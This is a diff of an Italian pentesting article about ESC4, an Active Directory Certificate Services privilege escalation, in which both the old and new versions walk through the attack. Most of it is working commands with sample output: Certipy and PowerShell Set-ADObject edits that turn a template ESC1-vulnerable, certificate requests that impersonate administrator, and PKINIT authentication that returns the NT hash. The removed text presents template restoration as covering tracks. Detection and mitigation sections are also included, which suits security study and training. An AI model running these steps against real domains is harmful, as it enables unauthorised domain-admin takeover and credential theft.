@@ -1,326 +1,318 @@
 ---
 title: 'ESC4 ADCS Privilege Escalation: Template Hijacking con Certipy'
 slug: esc4-adcs
-description: >-
-  ESC4 ADCS Privilege Escalation: sfruttare ACL deboli sui certificate template
-  Active Directory per trasformarli in ESC1 e ottenere Domain Admin con Certipy.
+description: 'ESC4 ADCS Privilege Escalation: sfruttare ACL deboli sui certificate template Active Directory per trasformarli in ESC1 e ottenere Domain Admin con Certipy.'
 image: /BCO.9ce6ba52-ce57-472f-b167-52ab8931a51e.webp
 draft: false
 date: 2026-03-07T00:00:00.000Z
+lastmod: 2026-06-23T00:00:00.000Z
 categories:
   - windows
 subcategories:
   - privilege-escalation
 tags:
-  - ad
+  - 'privilege-escalation,esc4'
   - adcs
-  - esc
   - certipy
 ---
 
-ESC4 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che consiste nel **modificare direttamente un certificate template in Active Directory**.
+# ADCS ESC4: Privilege Escalation via Permessi sui Certificate Template
 
-I certificate template sono oggetti AD salvati in:
+ESC4 è una tecnica di privilege escalation su Active Directory che sfrutta **permessi di scrittura su un certificate template**. I certificate template sono oggetti AD — se un attaccante ha i permessi per modificarli, può trasformare un template sicuro in uno vulnerabile (tipicamente ESC1) e ottenere certificati per qualsiasi utente del dominio, Administrator incluso.
+
+I template vivono in AD sotto:
 
 ```
 CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration
 ```
 
-Se un attaccante ottiene **permessi di scrittura sul template**, può modificarlo e trasformarlo in un template vulnerabile (tipicamente **ESC1**).
-
 ***
 
-# Quando esiste ESC4
+## Quando esiste ESC4
 
-ESC4 esiste quando un utente ha permessi sul template come:
+ESC4 è sfruttabile quando un utente (o un gruppo di cui fa parte) ha uno di questi permessi sull'oggetto template:
 
 ```
+GenericAll / FullControl
 WriteDACL
 WriteOwner
 WriteProperty
-FullControl
 ```
 
-Questo permette di modificare attributi critici come:
+Questi permessi permettono di modificare attributi critici del template:
 
 ```
-msPKI-Certificate-Name-Flag
-pKIExtendedKeyUsage
-msPKI-Enrollment-Flag
-nTSecurityDescriptor
+msPKI-Certificate-Name-Flag      → controlla ENROLLEE_SUPPLIES_SUBJECT
+pKIExtendedKeyUsage              → gli EKU del certificato
+msPKI-Certificate-Application-Policy → Application Policy (sovrascrive EKU)
+msPKI-Enrollment-Flag            → manager approval, publish to DS
+msPKI-RA-Signature               → authorized signatures required
+nTSecurityDescriptor             → ACL dell'oggetto template
 ```
+
+Con GenericAll puoi modificare tutti questi attributi in un colpo solo. Con WriteDACL o WriteProperty potresti dover lavorare attributo per attributo.
 
 ***
 
-# Cosa può fare l’attaccante
+## Identificazione
 
-Con questi permessi può:
-
-```
-abilitare Enrollee Supplies Subject
-aggiungere Client Authentication EKU
-dare enrollment a Domain Users
-disabilitare Manager Approval
-```
-
-In pratica trasforma il template in **ESC1**.
-
-***
-
-# Identificazione con Certipy
-
-Enumerazione template:
+### Da Kali con Certipy
 
 ```bash
-certipy find -u attacker@corp.local -p 'Passw0rd!'
+certipy find -u attacker@corp.local -p 'Passw0rd!' -dc-ip 10.0.0.100 -vulnerable -stdout
 ```
 
-Output tipico:
+Output tipico quando c'è ESC4:
 
 ```
-Template Name : SecureFiles
-
+Template Name                 : Web
+[...]
 Object Control Permissions
-Full Control Principals : Authenticated Users
+  Full Control Principals     : CORP\webdevelopers
 
 [!] Vulnerabilities
-ESC4 : User has dangerous permissions
+  ESC4 : 'CORP\\webdevelopers' has dangerous permissions on the template
 ```
 
-Indicatori chiave:
+### Da Windows con Certify
 
+```powershell
+.\Certify.exe find
 ```
-User ACL Principals
-WriteDACL
-WriteOwner
-FullControl
+
+Nell'output cerca `Full Control Principals` o `WriteDACL Principals` con utenti non amministrativi. Se il tuo utente o un suo gruppo compare lì — hai ESC4.
+
+### Con certutil nativo (LOLBin, zero rumore)
+
+```powershell
+certutil -catemplates
 ```
+
+Se il template appare con `Auto-Enroll` invece di `Access is denied` — hai almeno enrollment rights, poi verifichi i permessi con Certify o BloodHound.
 
 ***
 
-# Exploitation ESC4
+## Exploitation
 
-L’attacco avviene in **tre fasi**.
-
-1️⃣ modificare template
-2️⃣ ottenere certificato admin
-3️⃣ autenticarsi
+L'attacco si divide in tre fasi: modificare il template, richiedere il certificato, autenticarsi.
 
 ***
 
-# Step 1 — modificare il template
+### Metodo 1 — Certipy da Kali (hai credenziali)
 
-Certipy può trasformare automaticamente il template in uno **ESC1 vulnerable**.
+**Step 1 — Modifica il template**
+
+Certipy trasforma il template in ESC1 con un comando solo. Prima salva il backup della configurazione originale, poi applica la configurazione ESC1 di default:
 
 ```bash
+# Certipy v5.x
 certipy template \
--u attacker@corp.local -p 'Passw0rd!' \
--dc-ip 10.0.0.100 \
--template SecureFiles \
--write-default-configuration
+  -u attacker@corp.local -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 \
+  -template NomeTemplate \
+  -save-configuration NomeTemplate.json \
+  -write-default-configuration
 ```
 
-Questo comando modifica il template e:
+`-save-configuration` salva la config originale in JSON prima di modificare — fondamentale per il ripristino. `-write-default-configuration` applica la configurazione ESC1: abilita `ENROLLEE_SUPPLIES_SUBJECT`, aggiunge Client Authentication, apre enrollment a Authenticated Users e disabilita manager approval.
 
-```
-abilita Enrollee Supplies Subject
-aggiunge Client Authentication
-dà enrollment a Authenticated Users
-rimuove manager approval
-```
+> Nota: nelle versioni certipy v4.x il flag di backup si chiamava `-save-old`. Da v5.x è stato rinominato in `-save-configuration <file>`.
 
-Backup automatico:
-
-```
-SecureFiles.json
-```
-
-***
-
-# Step 2 — richiedere certificato Administrator
-
-Ora il template è vulnerabile.
+**Step 2 — Richiedi il certificato**
 
 ```bash
 certipy req \
--u attacker@corp.local -p 'Passw0rd!' \
--dc-ip 10.0.0.100 \
--target CA.CORP.LOCAL \
--ca CORP-CA \
--template SecureFiles \
--upn administrator@corp.local \
--sid S-1-5-21-...-500
+  -u attacker@corp.local -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 \
+  -target ca.corp.local \
+  -ca CORP-CA \
+  -template NomeTemplate \
+  -upn administrator@corp.local
+```
+
+Certipy genera direttamente il PFX — non serve passare per openssl.
+
+**Step 3 — Autenticati**
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip 10.0.0.100
 ```
 
 Output:
 
 ```
-Successfully requested certificate
-Saving certificate to administrator.pfx
+[*] Got TGT
+[*] Got NT hash for 'administrator@corp.local': aad3b435b51404eeaad3b435b51404ee:...
 ```
 
-***
-
-# Step 3 — autenticarsi
+**Step 4 — Ripristina il template**
 
 ```bash
-certipy auth \
--pfx administrator.pfx \
--dc-ip 10.0.0.100
-```
-
-Output:
-
-```
-Got TGT
-Got NT hash for administrator
-```
-
-Accesso ottenuto:
-
-```
-Domain Admin
-```
-
-***
-
-# Step 4 — ripristinare template (opzionale)
-
-Per coprire le tracce.
-
-```bash
+# Certipy v5.x
 certipy template \
--u attacker@corp.local -p 'Passw0rd!' \
--dc-ip 10.0.0.100 \
--template SecureFiles \
--write-configuration SecureFiles.json \
--no-save
+  -u attacker@corp.local -p 'Passw0rd!' \
+  -dc-ip 10.0.0.100 \
+  -template NomeTemplate \
+  -write-configuration NomeTemplate.json
 ```
 
-Il template torna allo stato originale.
+Il template torna esattamente com'era prima. In un engagement reale è obbligatorio.
 
 ***
 
-# Perché ESC4 è potente
+### Metodo 2 — PowerShell da Windows (hai shell sull'host)
 
-Perché permette di **creare nuove vulnerabilità AD CS**.
+Questo metodo è quello giusto quando `certipy find -vulnerable` o `Certify.exe find /vulnerable` **non trovano nulla** — ma tu sai da BloodHound o dall'output di Certify che hai GenericAll, WriteDACL o WriteProperty sul template.
 
-L’attaccante può trasformare un template sicuro in:
+Perché succede? Certipy e Certify cercano template già misconfigured di default. Se il template è configurato correttamente ma tu hai i permessi per modificarlo, non lo segnalano come vulnerabile — perché non lo è ancora. Sei tu che lo rendi tale.
 
-```
-ESC1
-ESC2
-ESC3
-```
+Quindi il workflow è: BloodHound mostra GenericAll su un `CertTemplate` → `certutil -catemplates` mostra che hai Auto-Enroll su quel template → il template non è ESC1 ma tu puoi renderlo tale → usi questo metodo.
 
-***
+Usa `Set-ADObject` e `certreq`, entrambi nativi Windows — zero tool aggiuntivi da caricare.
 
-# Limite importante
+**Step 1 — Aggiungi gli EKU al template**
 
-ESC4 funziona **solo se il template è già pubblicato sulla CA**.
+Il template di default ha solo Server Authentication — serve per i siti HTTPS ma non permette di autenticarsi come utente AD. Con GenericAll puoi aggiungere i due OID che trasformano il template in ESC1:
 
-Se non è pubblicato serve:
-
-```
-ESC7
+```powershell
+$EKUs = @("1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2")
+Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=dominio,DC=htb" `
+  -Add @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
 ```
 
-(per abilitarlo sulla CA).
+`1.3.6.1.5.5.7.3.2` è Client Authentication — permette al certificato di essere usato per autenticarsi verso il DC via PKINIT. `1.3.6.1.4.1.311.20.2.2` è Smart Card Logon — richiesto da molti DC per supportare PKINIT correttamente. Si aggiungono sempre in coppia. Il DN completo del template lo trovi nell'output di Certify o BloodHound sotto `Distinguished Name`. Per capire cosa fa ogni OID, vedi la [guida agli EKU OID in ADCS](https://hackita.it/articoli/adcs-eku-oid-offensive/).
 
-***
+Verifica che la modifica sia andata a buon fine:
 
-# Detection ESC4
-
-Indicatori principali:
-
-```
-WriteDACL
-WriteOwner
-FullControl
-WriteProperty
+```powershell
+.\Certify.exe find /template:NomeTemplate
+# pkiextendedkeyusage: Client Authentication, Server Authentication, Smart Card Logon
 ```
 
-su template.
+**Step 2 — Genera la cert request da Kali**
 
-Audit:
+Da Kali si genera una **chiave privata** e una **cert request**. La chiave rimane da parte tua — non la mandi mai alla CA. La request dice alla CA: "voglio un certificato, ecco la mia chiave pubblica, e il certificato deve essere intestato a `administrator@dominio.htb`" — questo è possibile perché il template ha `ENROLLEE_SUPPLIES_SUBJECT`.
 
 ```bash
-certipy find
+cat > admin.cnf << EOF
+[ req ]
+default_bits = 2048
+prompt = no
+req_extensions = user
+distinguished_name = dn
+
+[ dn ]
+CN = Administrator
+
+[ user ]
+subjectAltName = otherName:msUPN;UTF8:administrator@dominio.htb
+EOF
+
+openssl req -config admin.cnf \
+  -subj "/DC=htb/DC=dominio/CN=Users/CN=Administrator" \
+  -new -nodes -sha256 -out administrator.req -keyout administrator.key
 ```
 
-oppure con BloodHound.
+Genera due file: `administrator.key` (tieni privata) e `administrator.req` (da mandare alla CA).
+
+**Step 3 — Fai firmare la request dalla CA**
+
+Si carica `administrator.req` sulla macchina Windows e si sottomette alla CA con `certreq` — nativo Windows, zero tool aggiuntivi. La CA verifica che il template esista, che tu abbia enrollment rights, e firma il certificato:
+
+```powershell
+certreq -submit -config "earth.dominio.htb\NOME-CA" `
+  -attrib "CertificateTemplate:NomeTemplate" administrator.req administrator.cer
+# Certificate retrieved(Issued)
+```
+
+`administrator.cer` è il certificato firmato dalla CA — pubblico, intestato ad Administrator, con Client Auth e Smart Card Logon come EKU.
+
+**Step 4 — Crea il PFX e autenticati**
+
+`certipy auth` per autenticarsi ha bisogno di cert + chiave privata insieme. Il formato PFX li contiene entrambi in un file solo:
+
+```bash
+openssl pkcs12 -export -in administrator.cer -inkey administrator.key -out administrator.pfx
+```
+
+Quindi `administrator.req` → CA → `administrator.cer` (pubblico) + `administrator.key` (privato) → `administrator.pfx` (entrambi). Poi certipy usa il PFX per fare PKINIT e ottenere TGT + NT hash:
+
+```bash
+certipy auth -pfx administrator.pfx -dc-ip <IP_DC>
+# [*] Got TGT
+# [*] Got NT hash for 'administrator': aad3b435b51404eeaad3b435b51404ee:...
+```
+
+**Step 5 — Ripristina il template**
+
+```powershell
+Set-ADObject "CN=NomeTemplate,CN=Certificate Templates,..." `
+  -Remove @{pKIExtendedKeyUsage=$EKUs;"msPKI-Certificate-Application-Policy"=$EKUs}
+```
 
 ***
 
-# Mitigation ESC4
+## Confronto metodi
 
-### Limitare ACL template
-
-Solo gruppi amministrativi devono avere permessi:
-
-```
-Enterprise Admins
-PKI Admins
-```
-
-***
-
-### Audit periodico template
-
-Controllare ACL su:
-
-```
-CN=Certificate Templates
-```
+|                              | Certipy (Kali)   | PowerShell (Windows)              |
+| ---------------------------- | ---------------- | --------------------------------- |
+| Richiede credenziali         | Sì               | No (usa contesto utente corrente) |
+| Richiede tool aggiuntivi     | Certipy          | Solo modulo AD nativo             |
+| Backup automatico config     | Sì (`-save-old`) | No — salva manualmente prima      |
+| Genera PFX direttamente      | Sì               | No — serve openssl separato       |
+| Funziona senza shell Windows | Sì               | No                                |
 
 ***
 
-### Usare tool di auditing
+## Limite importante
 
-Utili:
+ESC4 funziona **solo se il template è già pubblicato sulla CA**. Se il template esiste in AD ma non è abilitato sulla CA, la `certreq` fallirà. In quel caso serve ESC7 per abilitarlo.
 
+***
+
+## Detection
+
+**Event ID 5136** — A directory service object was modified. Si genera quando vengono modificati gli attributi del template (`pKIExtendedKeyUsage`, `msPKI-Certificate-Application-Policy`) da parte di un account non in un gruppo PKI amministrativo. È la detection più efficace per ESC4.
+
+**Event ID 4887** — Certificate issued. Se il SAN del certificato emesso non corrisponde all'account richiedente → alert.
+
+**Event ID 4768** con `PreAuthType=16` — autenticazione PKINIT da un account privilegiato in modo insolito.
+
+***
+
+## Mitigation
+
+Solo `Enterprise Admins` e gruppi PKI dedicati devono avere permessi di scrittura sui template. Si verifica con:
+
+```bash
+certipy find -vulnerable
 ```
-BloodHound
-PingCastle
-Certipy
-```
+
+oppure con BloodHound cercando edge `GenericAll`, `WriteDACL`, `WriteOwner` verso nodi `CertTemplate`.
+
+Audit periodico degli ACL su `CN=Certificate Templates` e disabilitazione dei template legacy non utilizzati riducono drasticamente la superficie d'attacco.
 
 ***
 
-### Disabilitare template inutilizzati
+## FAQ
 
-Molti template legacy non servono.
+**ESC4 modifica la CA?**
+No — modifica solo l'oggetto template in AD. La CA non viene toccata.
 
-***
+**Se ho solo WriteDACL posso fare ESC4?**
+Sì — con WriteDACL puoi prima darti GenericAll e poi procedere come sopra.
 
-# FAQ — ESC4 ADCS
+**Devo ripristinare il template?**
+In produzione sì, sempre. Il template modificato con Client Auth + ENROLLEE\_SUPPLIES\_SUBJECT diventa sfruttabile da qualsiasi utente autenticato nel dominio.
 
-### Cos'è ESC4?
-
-Un attacco che sfrutta **permessi di scrittura su un certificate template**.
-
-### Cosa permette?
-
-Modificare il template e renderlo vulnerabile.
-
-### ESC4 porta a Domain Admin?
-
-Sì, trasformando il template in **ESC1**.
-
-### ESC4 modifica la CA?
-
-No. Modifica **solo il template in Active Directory**.
+**Certipy `find -vulnerable` non mostra ESC4. Perché?**
+Potrebbe non avere visibilità completa sugli ACL. Verifica con Certify da Windows o con una query LDAP diretta sugli attributi di sicurezza del template.
 
 ***
 
-**Key Takeaway:** se un utente può modificare un certificate template in AD, può trasformarlo in un template vulnerabile e ottenere certificati per qualsiasi utente del dominio.
+## Risorse correlate
 
-***
-
-> Guida completa AD CS escalation:
-> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con:
-> [https://hackita.it/articoli/esc5-adcs](https://hackita.it/articoli/esc5-adcs) · [https://hackita.it/articoli/esc6-adcs](https://hackita.it/articoli/esc6-adcs)Supporta HackIta:
-> [https://hackita.it/supporto](https://hackita.it/supporto)Pentest Active Directory o formazione offensiva:
-> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
-> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
-> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
+* [EKU OID in ADCS: guida offensiva completa — hackita.it](https://hackita.it/articoli/adcs-eku-oid-offensive/)
+* [Attacchi ADCS ESC1–ESC16 — hackita.it](https://hackita.it/articoli/adcs-esc1-esc16/)
+* [Certipy — GitHub](https://github.com/ly4k/Certipy)
+* [Certified Pre-Owned — SpecterOps](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
